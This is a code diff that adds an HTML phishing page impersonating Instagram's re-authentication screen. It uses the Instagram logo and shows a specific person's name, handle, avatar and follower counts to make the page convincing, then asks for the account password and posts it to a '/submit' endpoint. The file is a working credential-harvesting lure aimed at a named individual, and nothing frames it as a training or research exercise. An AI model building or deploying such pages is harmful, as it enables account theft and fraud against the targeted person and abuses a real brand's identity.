@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram • Re-authenticate</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: #fafafa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      width: 320px;
+      text-align: center;
+      border-radius: 10px;
+    }
+
+    .logo {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+
+    .avatar {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      margin-bottom: 10px;
+    }
+
+    .name {
+      font-weight: bold;
+      font-size: 16px;
+    }
+
+    .username {
+      color: #555;
+      font-size: 14px;
+    }
+
+    .stats {
+      font-size: 13px;
+      color: #999;
+      margin: 5px 0 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #0095f6;
+      color: white;
+      border: none;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #007acc;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <img src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo-500x281.png" class="logo" />
+    <img src="https://i.pinimg.com/736x/9f/16/72/9f1672710cba6bcb0dfd93201c6d4c00.jpg" class="avatar" />
+    <div class="name"><b>Ojasvi.</b></div>
+    <div class="username">@ojasvi_maheshwari</div>
+    <div class="stats">210 followers • 201 following</div>
+
+    <form action="/submit" method="POST" onsubmit="return validatePassword()">
+      <input type="password" id="password" name="password" placeholder="Enter your password" required />
+      <button type="submit">Log In</button>
+    </form>
+
+    <script>
+      function validatePassword() {
+        const pwd = document.getElementById('password').value;
+        if (pwd.length < 8) {
+          alert("Password must be at least 8 characters long.");
+          return false;
+        }
+        return true;
+      }
+    </script>
+  </div>
+</body>
+
+</html>
